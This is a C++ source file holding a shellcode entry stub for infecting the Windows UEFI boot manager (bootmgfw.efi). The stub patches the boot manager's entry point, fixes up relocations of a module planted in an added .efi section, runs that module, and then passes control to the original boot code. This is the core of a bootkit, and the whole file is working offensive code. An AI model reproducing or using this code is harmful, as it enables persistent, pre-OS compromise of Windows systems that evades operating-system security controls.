#include "shellcode.h"

namespace shellcode
{
	void* entry_stub(void* a, void* b)
	{
		// 0xDEADBEEF is replaced at runtime...
		auto module_base = reinterpret_cast<std::uintptr_t>(&entry_stub) + 0xDEADBEEF;
		auto bootmgfw_base = reinterpret_cast<std::uintptr_t>(&entry_stub) - 0xDEADBEEF;
		NT_HEADER(bootmgfw_base)->OptionalHeader.AddressOfEntryPoint = 0xDEADBEEF;

		// fix relocs of the module in .efi section...
		auto base_reloc_dir = &NT_HEADER(module_base)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		if (base_reloc_dir->VirtualAddress)
		{
			auto reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(module_base + base_reloc_dir->VirtualAddress);
			for (auto current_size = 0u; current_size < base_reloc_dir->Size; )
			{
				std::u32_t reloc_count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(u16);
				auto reloc_data = reinterpret_cast<std::u16_t*>((u8*)reloc + sizeof(IMAGE_BASE_RELOCATION));
				auto reloc_base = reinterpret_cast<std::u8_t*>(module_base) + reloc->VirtualAddress;

				for (auto i = 0u; i < reloc_count; ++i, ++reloc_data)
				{
					std::u16_t data = *reloc_data;
					std::u16_t type = data >> 12;
					std::u16_t offset = data & 0xFFF;

					switch (type)
					{
					case IMAGE_REL_BASED_ABSOLUTE:
						break;
					case IMAGE_REL_BASED_DIR64:
					{
						auto rva = reinterpret_cast<std::uintptr_t*>(reloc_base + offset);
						*rva = module_base + (*rva - NT_HEADER(module_base)->OptionalHeader.ImageBase);
						break;
					}
					default:
						break;
					}
				}

				current_size += reloc->SizeOfBlock;
				reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reloc_data);
			}
		}

		// call our entry...
		reinterpret_cast<void(__fastcall*)(void*, void*)>(
			module_base + NT_HEADER(module_base)->OptionalHeader.AddressOfEntryPoint)(a, b);

		// call the original entry...
		return reinterpret_cast<void* (__fastcall*)(void*, void*)>(
			bootmgfw_base + NT_HEADER(bootmgfw_base)->OptionalHeader.AddressOfEntryPoint)(a, b);
	}
}